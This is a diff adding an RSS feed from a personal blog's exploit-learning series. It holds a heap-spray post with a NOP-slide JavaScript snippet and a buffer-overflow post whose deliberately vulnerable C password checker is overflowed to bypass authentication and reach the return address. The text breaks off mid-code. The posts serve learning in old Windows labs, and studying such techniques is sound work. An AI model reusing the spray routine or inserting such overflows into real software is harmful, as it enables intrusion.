@@ -1,0 +1,583 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>StackOverflow on Misaka's Secrect Garden</title><link>https://blog.moeomu.com/tags/stackoverflow/</link><description>Recent content in StackOverflow on Misaka's Secrect Garden</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sun, 25 Oct 2020 17:56:00 +0800</lastBuildDate><atom:link href="https://blog.moeomu.com/tags/stackoverflow/index.xml" rel="self" type="application/rss+xml"/><item><title>Exploit learning notes 010 HeapSpray</title><link>https://blog.moeomu.com/posts/exploit-learning-notes-010-heapspray/</link><pubDate>Sun, 25 Oct 2020 17:56:00 +0800</pubDate><guid>https://blog.moeomu.com/posts/exploit-learning-notes-010-heapspray/</guid><description>&lt;p>Disclaimer: The experimental environment is Windows 2000&lt;/p>
+&lt;p>Source: &lt;a class="link" href="https://blog.moeomu.com/posts/exploit-learning-notes-010-heapspray/" >Moeomu&amp;rsquo;s blog&lt;/a>&lt;/p>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;blockquote>
+&lt;p>Attacks against browsers often use a combination of heap and stack co-option vulnerabilities&lt;/p>
+&lt;/blockquote>
+&lt;ul>
+&lt;li>When there is an overflow vulnerability in the browser or in the ActiceX control it uses, an attacker can generate a special HTML file to trigger the vulnerability&lt;/li>
+&lt;li>Whether it is a heap overflow or a stack overflow, the vulnerability can eventually gain an EIP when triggered&lt;/li>
+&lt;li>Sometimes it can be difficult to know the full shellcode in the complex memory environment of the browser&lt;/li>
+&lt;li>The JavaScript in the page can request heap memory, so the shellcode is laid out in the heap via JavaScript as a possibility&lt;/li>
+&lt;li>How to locate the shellcode in the heap: HeapSpray&lt;/li>
+&lt;/ul>
+&lt;h2 id="technical-details">Technical details&lt;/h2>
+&lt;ul>
+&lt;li>When using Heap Spray, the EIP is usually pointed to the heap area &lt;code>0x0C0C0C0C&lt;/code> location, and then JavaScript is used to request the use of a large amount of heap memory and overwrite it with a memory slice containing &lt;code>0x9&lt;/code>0 and shellcode&lt;/li>
+&lt;li>Normally, JS allocates memory from low addresses to high addresses, so if you request more than 200MB of memory, 0x0C0C0C0C will be overwritten by the memory slice containing the shellcode, and as long as 0x90 in the memory slice can hit 0x0C0C0C0C, the shellcode can be executed&lt;/li>
+&lt;/ul>
+&lt;h2 id="js-code">JS code&lt;/h2>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-JavaScript" data-lang="JavaScript">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">nop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">unescape&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;%u9090%u9090&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">nop&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">&amp;lt;=&lt;/span> &lt;span class="mh">0x100000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">nop&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="nx">nop&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>&lt;span class="c1">//生成一个 1MB 大小充满 0x90 的数据块
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">nop&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">nop&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">substring&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">32&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">shellcode&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">slide&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Arrary&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">200&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">slide&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">nop&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">shellcode&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>Explanation
+&lt;ul>
+&lt;li>Each memory slice is 1MB in size&lt;/li>
+&lt;li>First generate a memory block of size 1MB and all filled with 0x90&lt;/li>
+&lt;li>Since Java fills the requested memory with some extra information, to ensure that the memory slice is 1MB, this space is subtracted&lt;/li>
+&lt;li>We use 200 of these memory slices to cover the heap memory, as long as any nop area can cover 0x0C0C0C0C, it will work&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>extra space&lt;/p>
+&lt;/blockquote>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>size&lt;/th>
+&lt;th>description&lt;/th>
+&lt;th>&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>malloc header&lt;/td>
+&lt;td>32 byte&lt;/td>
+&lt;td>heap block information&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>string length&lt;/td>
+&lt;td>4 byte&lt;/td>
+&lt;td>indicates the length of the string&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>terminator 2&lt;/td>
+&lt;td>1 byte&lt;/td>
+&lt;td>heap block information&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h2 id="practice">Practice&lt;/h2>
+&lt;ul>
+&lt;li>To be continued&lt;/li>
+&lt;/ul></description></item><item><title>Exploit Learning Notes 001 Buffer Overflow</title><link>https://blog.moeomu.com/posts/exploit-learning-notes-001-buffer-overflow/</link><pubDate>Sun, 18 Oct 2020 10:00:00 +0800</pubDate><guid>https://blog.moeomu.com/posts/exploit-learning-notes-001-buffer-overflow/</guid><description>&lt;blockquote>
+&lt;ul>
+&lt;li>Functional logic bugs (Bugs)&lt;/li>
+&lt;li>Security Logic Flaw (Vulnerability)&lt;/li>
+&lt;/ul>
+&lt;p>&lt;a class="link" href="exploit-study-01.zip" >Click here to download this article with code, executable, shellcode file&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>Source: &lt;a class="link" href="https://blog.moeomu.com/posts/exploit-learning-notes-001-buffer-overflow/" >Moeomu&amp;rsquo;s blog&lt;/a>&lt;/p>
+&lt;h2 id="pe-concepts">PE concepts&lt;/h2>
+&lt;h3 id="mapping-between-pe-file-and-virtual-memory">Mapping between PE file and virtual memory&lt;/h3>
+&lt;ul>
+&lt;li>ImageBase: load base address, 0x00400000 for (.EXE), 0x10000000 for (.DLL)&lt;/li>
+&lt;li>FileOffset: file offset address&lt;/li>
+&lt;li>VirtualAddress: virtual address, is the address mapped to memory&lt;/li>
+&lt;li>RelativeVirtualAddress: Relative virtual address, is the offset of the virtual address VA relative to the load base address&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>VA = ImageBase + RVA&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="data-complementary-padding-rules">Data Complementary Padding Rules&lt;/h3>
+&lt;ul>
+&lt;li>When on disk, each section (.section) of the PE file is stored in 0x200 bytes, when the size of the section is less than 0x200, use 0x0 to fill, when the size of the section exceeds 0x200, allocate the next 0x200 size to this section&lt;/li>
+&lt;li>When in memory, each section (.section) of a PE file is stored in units of 0x1000 bytes, with the same rules as above&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>SectionOffset = RVA - FileOffset&lt;br>
+FileOffset = VA - ImageBase - SectionOffset = RVA - SectionOffset&lt;/p>
+&lt;p>For example .text section RVA=0x1000, FileOffset=0x400, then SectionOffset=0xC00&lt;br>
+Command file offset at 0x00404141 is 0x00404141 - 0x00400000 - (0x1000 - 0x400) = 0x3541&lt;/p>
+&lt;/blockquote>
+&lt;h3 id="function-calling-convention">Function calling convention&lt;/h3>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>C&lt;/th>
+&lt;th>SysCall&lt;/th>
+&lt;th>StdCall&lt;/th>
+&lt;th>BASIC&lt;/th>
+&lt;th>FORTRAN&lt;/th>
+&lt;th>PASCAL&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>Parameter stack order&lt;/td>
+&lt;td>right-&amp;gt;left&lt;/td>
+&lt;td>right-&amp;gt;left&lt;/td>
+&lt;td>right-&amp;gt;left&lt;/td>
+&lt;td>left-&amp;gt;right&lt;/td>
+&lt;td>left-&amp;gt;right&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>Restore stack balance position&lt;/td>
+&lt;td>parent function&lt;/td>
+&lt;td>sub function&lt;/td>
+&lt;td>sub function&lt;/td>
+&lt;td>sub function&lt;/td>
+&lt;td>sub function&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h3 id="buffer-overflow">Buffer overflow&lt;/h3>
+&lt;blockquote>
+&lt;p>stack frames are adjacent, local variables are adjacent, and if the array is out of bounds, it overwrites the local variables and then the function return address&lt;br>
+control program flow by flooding stack frame return address values&lt;/p>
+&lt;/blockquote>
+&lt;hr>
+&lt;h2 id="shellcode">ShellCode&lt;/h2>
+&lt;h3 id="exploitshellcodepayload-division-of-labor">Exploit/ShellCode(Payload) division of labor&lt;/h3>
+&lt;ul>
+&lt;li>Exploit&amp;rsquo;s role is to precisely exploit some kind of vulnerability with the goal of hijacking the EIP&lt;/li>
+&lt;li>ShellCode will execute malicious/goodwill code and is the attack payload&lt;/li>
+&lt;li>ShellCode is generally generic, Exploit can only work for a specific vulnerability&lt;/li>
+&lt;/ul>
+&lt;h3 id="example">Example&lt;/h3>
+&lt;p>This example uses simple password authentication to test the vulnerability&lt;/p>
+&lt;hr>
+&lt;h4 id="buffer-overflow-control-program-flag">Buffer Overflow Control Program Flag&lt;/h4>
+&lt;h5 id="code-expstd0101">code (ExpStd0101)&lt;/h5>
+&lt;blockquote>
+&lt;p>Compile environment: Windows XP SP3, Visual C++ 6, Debug&lt;br>
+Experimental environment: Windows XP SP3&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define PASSWORD &amp;#34;1234567&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">authenticated&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PASSWORD&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Input Number:&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">scanf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%s&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">valid_flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;ERROR!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;OK!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h5 id="analysis-expstd0101">Analysis (ExpStd0101)&lt;/h5>
+&lt;ul>
+&lt;li>
+&lt;p>Simple analysis&lt;/p>
+&lt;ul>
+&lt;li>When input 999999999, its end &lt;code>'\0'&lt;/code> will fill the 9th byte, exactly changing the lowest 1 byte of authenticated 0x1 to 0x0&lt;/li>
+&lt;li>This is also related to strcmp function, if &lt;code>str1&amp;lt;str2&lt;/code>, the authenticated value -1 is stored with inverse code &lt;code>FFFFFFFF&lt;/code>, even if the low bit &lt;code>FF&lt;/code> overflows to &lt;code>00&lt;/code>, it is useless, so not all 8-bit characters can bypass authentication&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Further verification&lt;/p>
+&lt;ul>
+&lt;li>When 8 9s are entered, the 8-byte buffer is filled, covering 1 byte of authenticated space&lt;/li>
+&lt;li>When 11 9s are entered, the 8-byte buffer fills up and covers 4 bytes of authenticated space, i.e. authenticated is completely overwritten and it is flushed as &lt;code>0x003939393939&lt;/code>&lt;/li>
+&lt;li>When 15 9s are input, the 8-byte buffer is filled, covering 4 bytes of authenticated space, and the space where this function EBP is located is also covered (the content is the parent function EBP)&lt;/li>
+&lt;li>When 19 9s are entered, the 8-byte buffer is filled, the 4-byte authenticated space is overwritten, the 4-byte EBP space is overwritten, and the 4-byte return address is overwritten&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>Further verification&lt;/p>
+&lt;ul>
+&lt;li>Since the keyboard can not enter some invisible characters, so replace it with read file authentication&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;h4 id="hard-coded-address-control-program-flow">Hard-coded address control program flow&lt;/h4>
+&lt;p>Use FILE for file reading&lt;/p>
+&lt;h5 id="code-expstd0102">code (ExpStd0102)&lt;/h5>
+&lt;blockquote>
+&lt;p>Compile environment: Windows XP SP3, Visual C++ 6, Debug&lt;br>
+Experimental environment: Windows XP SP3&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#define PASSWORD &amp;#34;1234567&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">verify_password&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">authenticated&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">password&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PASSWORD&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">strcpy&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">authenticated&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">valid_flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1024&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FILE&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">fp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;password.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;rw+&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
